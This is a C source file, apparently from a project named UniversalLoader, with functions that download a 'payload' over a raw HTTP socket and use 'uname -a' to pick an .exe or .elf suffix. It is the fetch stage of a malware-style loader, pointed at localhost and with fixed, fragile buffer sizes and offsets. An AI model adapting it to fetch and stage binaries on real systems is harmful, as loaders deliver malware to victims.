// SPDX-FileCopyrightText: 2025 The UniversalLoader development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

#include <arpa/inet.h> // inet_addr()
#include <fcntl.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 4096
#define SA struct sockaddr

int download_payload(int socket_descriptor, char *path) {
  // opening payload
  char *local_path = calloc(13, sizeof(char));
  local_path[0] = '.';
  strcat(local_path, path);

  printf("[i] downloading payload in :  '%s'\n", local_path);

  int file_descriptor = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);

  if (file_descriptor == -1) {
    printf("[x] failed to create or WRONLY open file '%s'\n", local_path);

    perror("file creation : ");

    return -1;
  }

  // building http header
  char *message = calloc(66, sizeof(char));
  strcpy(message, "GET ");
  strcat(message, path);
  strcat(message, " HTTP/1.1\r\n");
  strcat(message, "Host: 127.0.0.1\r\n");
  strcat(message, "Connection: closed\r\n");
  strcat(message, "\r\n");
  ssize_t written = write(socket_descriptor, message, 66);

  if (written == -1) {
    printf("[x] failed to send the http header\n");

    return -1;
  }

  unsigned char *buffer = malloc(600 * sizeof(unsigned char));

  if (buffer == NULL) {
    perror("buffer");

    return -1;
  }

  read(socket_descriptor, buffer, 600);

  printf("[i] web server send us -> %s", buffer + 201);

  written = write(file_descriptor, buffer + 201, 399);

  if (written == -1) {
    printf("[x] failed to write to file\n");

    return -1;
  }

  printf("successfully retrieved file from server\n");

  close(file_descriptor);
  close(socket_descriptor);

  return 0;
}

int update_payload(char **path) {
  int status = system("uname -a");

  if (status != 0) {
    (*path)[10] = 'x';
    (*path)[11] = 'e';
  }

  else {
    (*path)[10] = 'l';
    (*path)[11] = 'f';
  }

  return 0;
}
